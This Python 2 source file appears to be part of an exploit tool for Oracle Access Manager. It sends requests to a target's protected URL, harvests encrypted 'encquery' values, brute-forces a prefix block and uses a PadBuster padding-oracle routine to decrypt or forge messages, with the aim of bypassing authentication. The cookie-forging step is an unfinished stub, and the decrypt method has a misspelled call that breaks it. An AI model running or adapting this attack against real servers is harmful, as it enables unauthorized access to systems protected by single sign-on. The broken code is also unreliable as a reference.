import logging
import re

import os
import requests
import urllib
import urlparse
import base64
import sys

from constants import Constants
from constants import MessageInfo
from pad_buster import PadBuster


class OAMAuthBypass:
    def __init__(self, url):
        self._original_message = MessageInfo('', '', '', '')
        self._valid_message = MessageInfo('', '', '', '')
        self._is_initialized = False
        self._protected_url = url
        self._logger = logging.getLogger(Constants.LOGGER_NAME)

    def _initialize(self):
        # Initialize OAM URL, encquery and platform info
        # encquery is a valid message ended with a space character
        self._original_message = self._get_original_message()
        self._valid_message = self._get_valid_message()
        self._prefix_message = self._get_prefix_message()
        self._is_initialized = True

    def encrypt(self, cleartext):
        if not self._is_initialized:
            self._logger.info('Module not initialized. Initializing...')
            self._initialize()

        cleartext = urllib.unquote(cleartext)
        self._logger.info('Encrypting: %s...', cleartext)
        padbuster = PadBuster(prefix_message=self._prefix_message)
        ciphertext = padbuster.encrypt(plaintext=cleartext, block_size=Constants.DEFAULT_CIPHER_BLOCK_SIZE,
                                       iv=bytearray(Constants.DEFAULT_CIPHER_BLOCK_SIZE))
        self._logger.info('Ciphertext: %s', ciphertext)

    def decrypt(self, ciphertext):
        if not self._is_initialized:
            self._logger.info('Module not initialized. Initializing...')
            self._initialize()

        ciphertext = base64.b64decod(urllib.unquote(ciphertext))
        self._logger.info('Decrypting: %s...', ciphertext)
        padbuster = PadBuster(prefix_message=self._prefix_message)
        cleartext = padbuster.decrypt(plaintext=ciphertext, block_size=Constants.DEFAULT_CIPHER_BLOCK_SIZE,
                                      iv=bytearray(Constants.DEFAULT_CIPHER_BLOCK_SIZE))
        self._logger.info('Cleartext: %s', cleartext)

    def get_auth_cookie(self, username):
        # TODO Implement
        return username

    def _get_base_url(self):
        decoded_url = urllib.unquote(self._protected_url)#.decode('utf8')
        parsed_url = urlparse.urlparse(decoded_url)
        base_url = parsed_url.scheme + '://' + parsed_url.netloc + parsed_url.path
        self._logger.debug('Base URL: %s', base_url)
        return base_url

    def _get_encquery_message(self, requested_url):
        self._logger.debug('Requestng: %s', requested_url)
        response = requests.get(requested_url, verify=False, allow_redirects=False)
        content = response.text
        self._logger.debug(content)
        result = response.headers['Location']
        self._logger.debug('Result: %s', result)

        self._logger.debug('Parsing encquery parameter')
        self._logger.debug('Original URL: %s', result)
        decoded_url = urllib.unquote(result)#.decode('utf8')
        self._logger.debug('Decoded URL: %s', decoded_url)
        oam_url = decoded_url[:decoded_url.find('?')]

        parsed_url = urlparse.urlparse(decoded_url)
        self._logger.debug('Parsed URL: %s', parsed_url)
        encquery = urlparse.parse_qs(parsed_url.query)['encquery'][0]
        self._logger.debug('encquery: %s', encquery)
        fixed_encquery = encquery[:encquery.find('agentid=')].strip().replace(' ', '+')
        self._logger.debug('fixed_encquery: %s', fixed_encquery)
        decoded_encquery = base64.b64decode(fixed_encquery)
        extra_params = encquery[encquery.find('agentid='):]
        return MessageInfo(oam_url=oam_url, message='', encquery=decoded_encquery, extra_params=extra_params)

    def _get_original_message(self):
        self._logger.debug('Getting original encquery value...')
        msg = '?config=cas'
        url = self._get_base_url() + msg
        message = self._get_encquery_message(url)
        message = message._replace(message=msg)
        self._logger.debug('Original encquery: %s, length: %s', message.encquery.encode('hex'), len(message.encquery))
        return message

    def _get_valid_message(self):
        self._logger.debug('Getting valid encquery value...')
        base_url = self._get_base_url()
        previous_encquery_length = 0
        for i in range(1, 100):
            msg = '?config=cas&a=' + 'a' * i
            message = self._get_encquery_message(base_url + msg)
            message = message._replace(message=msg)
            encquery_length = len(message.encquery)
            self._logger.debug('new encquery length: %s', encquery_length)

            if encquery_length != previous_encquery_length and previous_encquery_length != 0:
                self._logger.debug('previous_encquery_length: %s, new encquery_length: %s', previous_encquery_length, encquery_length)
                if encquery_length - previous_encquery_length == Constants.DEFAULT_CIPHER_BLOCK_SIZE:
                    self._logger.debug('encquery_length length increased by %s bytes for msg: %s', Constants.DEFAULT_CIPHER_BLOCK_SIZE, msg)
                    self._logger.debug('encquery bytes: %s', message.encquery.encode('hex'))
                    return message
                else:
                    self._logger.error('Invalid encquery length: %s', encquery_length)
                    sys.exit() # TODO raise error
            else:
                previous_encquery_length = encquery_length

        self._logger.error('Failed to get encquery.')
        sys.exit()  # TODO raise error

    # Get a msg ending with space to start padding oracle attack using it
    def _get_prefix_message(self):
        self._logger.info('Bruteforcing prefix message...')
        msg = self._valid_message.encquery[:-(Constants.DEFAULT_CIPHER_BLOCK_SIZE)]  # remove last padding block
        chosen_block = ''  # should start with space character
        last = self._original_message.encquery[-(2 * Constants.DEFAULT_CIPHER_BLOCK_SIZE):]

        for i in range(0, 0x10000):
            chosen_block = os.urandom(16)
            final_msg = msg + chosen_block + last
            encoded_msg = base64.b64encode(final_msg)
            self._logger.debug('####################################### Original encquery: %s', self._original_message.encquery.encode('hex'))
            self._logger.debug('####################################### encquery: %s', self._valid_message.encquery.encode('hex'))
            self._logger.debug('####################################### Modified encquery: %s', final_msg.encode('hex'))

            url = self._valid_message.oam_url + "?encquery=" + urllib.quote(encoded_msg + '  ' + self._valid_message.extra_params)
            valid_msg = self._is_valid_padding(url)

            if valid_msg:
                self._logger.debug('Got msg using: %s', i)
                self._logger.debug('Prefix is: %s', base64.b64encode(final_msg))
                self._logger.info('Done!')
                return MessageInfo(oam_url=self._original_message.oam_url, message='', encquery=final_msg,
                                  extra_params=self._original_message.extra_params)

    def _is_valid_padding(self, requested_url): # TODO rename
        self._logger.debug('Requestng: %s', requested_url)
        response = requests.get(requested_url, verify=False, allow_redirects=False)
        content = response.text
        self._logger.debug(content)
        regex = r'System error.*please contact the Administrator.</p>'
        result = re.findall(regex, content)
        if not result:
            return True
        else:
            return False
